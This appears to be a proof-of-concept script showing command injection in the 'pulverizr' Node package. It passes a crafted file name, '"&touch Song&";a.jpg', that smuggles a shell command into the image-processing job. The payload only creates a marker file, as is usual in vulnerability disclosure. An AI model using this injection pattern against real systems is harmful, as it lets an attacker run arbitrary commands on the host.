var root = require("pulverizr");
var attack_code = "touch Song";
var injection_code = "\"&" + attack_code + "&\";a.jpg"
var inputs = [injection_code]

var job = root.createJob(inputs, {});
job.run();
